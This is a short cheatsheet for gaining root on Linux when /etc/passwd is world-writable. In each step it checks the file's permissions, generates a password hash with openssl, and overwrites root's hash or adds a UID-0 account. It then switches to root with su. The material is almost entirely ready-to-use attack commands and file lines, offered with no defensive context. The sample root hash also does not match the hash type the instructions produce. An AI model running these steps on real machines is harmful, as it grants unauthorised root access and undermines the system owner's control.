## /etc/passwd Privilege Escalation Cheatsheet

**Precondition:**

- `/etc/passwd` is **world-writable**

### 1. Check permissions

```bash
ls -l /etc/passwd
```

### 2. Generate password hash

```bash
openssl passwd -1 newpasswordhere
```

### 3. Edit `/etc/passwd`

Option A – replace root’s password hash:

```
root:etIsHFk/.HeMQ:0:0:root:/root:/bin/bash
```

Option B – add a new root-equivalent user:

```
newroot:<HASH>:0:0:root:/root:/bin/bash
```

### 4. Get root shell

```bash
su root
# or
su newroot
```

### 5. Cleanup

```bash
exit
```

---
